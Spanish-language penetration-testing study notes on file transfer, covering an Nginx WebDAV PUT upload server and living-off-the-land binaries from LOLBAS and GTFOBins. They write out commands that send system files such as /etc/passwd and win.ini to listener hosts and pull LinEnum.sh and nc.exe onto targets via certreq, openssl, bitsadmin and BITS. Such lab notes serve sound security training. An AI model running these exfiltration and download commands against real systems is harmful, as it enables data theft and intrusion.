Nosotros discutimos usando Pyhon3 "upload modulo" para hacer un servidor con sus capacidades, podemos usar Apache o Nginx

## NGINX - ENABLING PUT

Una buena alternativa para transferir archivos de apache es Nginx porque la configuracion es menos complicada, y el modulo no genera problemas de seguridad como Apache.

Cuando subimos HTPP, es 100 critico y para hacer codigos de ejecución. Apache hace que esto sea mas facil, y el modulo de php se puede configurar. Con Nginx podemos hacer que no sea tan simple

### CREAR UN DIRECTORIO SUBIENDO ARCHIVOS

```
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

### CREAR UN ARCHIVO DE CONFIGURACION DE NGINX

Se crea en /etc/nginx/sites-avaliable/upload.conf

```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
```

En caso de tener mensajes de error, chekear /var/log/nginx/error.log

```
tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80
ps -ef | grep 2811
```

### REMOVER CONFIGURACION POR DEFECTO

```
sudo rm /etc/nginx/sites-enabled/default
```
Ahora nosotros podemos subir usando cURL mandando respuestas "PUT". En el ejemplo de abajo, podemos subir el /etc/passwd llamado "user.txt"

```
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```

Una vez podemos probar a ir a la ruta por el navegador.

## VIVIR DE LA TIERRA

La frase "vivir en la tierra" es un termino de una discussion de twiter y es la información que tienen las páginas web

- Descarga
- Subida
- Ejecutar comandos
- Leer archivos
- Escribir archivo
- Bypass

### USAR LOLBAS Y GTFOBINS PROJECT

[LOLBAS para windows](https://lolbas-project.github.io/#) y [GTFOBins para Linux](https://gtfobins.github.io/) son wesites que buscan archivos binarios utilizando diferentes funciones.

### LOLBAS

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7b3c8f7c-51d2-4367-b6b9-0b75f82157ff)

Vamos a usar [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) Necesitaremos tener un puerto escuchando para saber el trafico que pasa

```
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
sudo nc -lvnp 8000
```
### GTFOBins

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/24131aae-e4e9-4076-b4e4-f1b891c4a013)

### CREAR UN CERTIFICADO

```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
### OTROS COMANDOS

```
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```



